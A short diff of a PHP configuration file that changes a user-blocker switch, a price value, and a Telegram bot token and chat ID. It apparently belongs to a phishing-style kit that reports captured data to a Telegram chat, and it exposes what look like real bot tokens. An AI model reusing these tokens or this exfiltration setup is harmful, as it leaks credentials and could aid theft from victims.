@@ -22,7 +22,7 @@ $blocker = "off"; // on = users blocked, off = users not blocked, on = li mn Den
 
 $price = "0.00";
 
-$token = "8929308191:AAESMSayxx54-8tkCZzcN_tMVoMtZIHmj6s";
-$chatid = "-5117936961";
+$token = "8529028584:AAF7Zjo0gb9Va07nEWcPMuuNG4SHH2PBv04";
+$chatid = "-5511604866";
 
 ?>
